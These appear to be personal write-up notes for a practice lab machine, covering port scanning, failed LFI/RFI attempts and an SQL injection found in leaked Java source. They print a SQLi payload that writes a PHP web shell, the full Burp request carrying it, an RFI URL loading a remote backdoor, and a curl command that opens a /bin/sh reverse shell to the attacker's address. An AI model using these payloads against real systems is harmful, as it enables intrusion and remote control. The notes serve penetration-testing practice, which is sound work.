## Initial Foothold + Privesc

Autorecon 
```
PORT      STATE  SERVICE      REASON         VERSION
22/tcp    open   ssh          syn-ack ttl 61 OpenSSH 8.4 (protocol 2.0)
111/tcp   closed rpcbind      reset ttl 61
139/tcp   closed netbios-ssn  reset ttl 61
443/tcp   closed https        reset ttl 61
445/tcp   closed microsoft-ds reset ttl 61
30455/tcp open   unknown      syn-ack ttl 61
50080/tcp open   unknown      syn-ack ttl 61
```
Wow autorecon missed port 17445. I am actually mad
```
17445/tcp open  unknown
```

Ports
- 30455 (web) - go to view source and saw this. Tried a bunch of stuff like LFI, RFI and SQLi but did not work.
```
</html><!-- Test adds with URL/?title=test -->
## LFI
http://192.168.228.147:30455/?title=../../../../../../../../../etc/passwd
## RFI
http://192.168.228.147:30455/?title=http://192.168.45.212/simple-backdoor.php&cmd=whoami
```
php info page at `http://192.168.228.147:30455/phpinfo.php`

- 50080 (web) - `http://192.168.228.147:50080/cloud/index.php` login page with credentials `admin:admin`. Don't think we can do anything here.

Cheated. We can do something on 50080. Download the `issuetracker.zip` . In `src/main/java/com/issue/tracker/issues/IssueController.java`
```
@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
	    Properties connectionProps = new Properties();
	    connectionProps.put("user", "issue_user");
	    connectionProps.put("password", "ManagementInsideOld797");
        try {
			conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
		    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
		    Statement stmt = conn.createStatement();
		    stmt.executeQuery(query);
```
How are you supposed to find this without cheating? And even if you did find it, its too easy to gloss over. Because the SQL query uses user input directly, we are be able to perform SQLi.

- 17445 (web) - register, login. Look around. 
Open burpsuite. Go to `/issue/checkByPriority` and turn on intercepter. Change payload from GET to POST and insert SQLI.
```
Normal' UNION SELECT '<?php echo system($_GET["cmd"]);?>' INTO OUTFILE '/srv/http/ball.php'; --
```

```
POST /issue/checkByPriority?priority=Normal%27%20UNION%20SELECT%20%27%3C%3Fphp%20echo%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%27%20INTO%20OUTFILE%20%27%2Fsrv%2Fhttp%2Fball.php%27%3B%20--%20 HTTP/1.1

Host: 192.168.228.147:17445

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.228.147:17445/login

Accept-Encoding: gzip, deflate, br

Cookie: JSESSIONID=EA504CEE72A05F9ECC0E07D7A3A4D4E4

Connection: keep-alive
```

In kali run below and catch shell at 50080.
```
curl 192.168.228.147:30455/balls.php?cmd=%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.212%2F50080%200%3E%261
```
